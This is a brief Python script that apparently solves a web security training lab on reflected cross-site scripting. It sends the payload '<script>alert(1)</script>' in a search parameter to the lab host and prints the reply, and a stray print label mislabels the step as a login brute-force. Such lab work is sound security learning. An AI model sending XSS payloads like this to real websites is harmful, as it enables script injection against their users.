# Lab: Reflected XSS into HTML context with nothing encoded

import requests


base = "https://0a40003803ed04b3801cc62300910057.web-security-academy.net"
search_session = requests.Session()
'''
when i search "1" on search box the request sends below:

GET /?search=1 HTTP/2
'''

print("===========[step1] prep files for login bruteforce===============")
do_search=search_session.get(f"{base}", params={"search":"<script>alert(1)</script>"})
print(do_search.text)
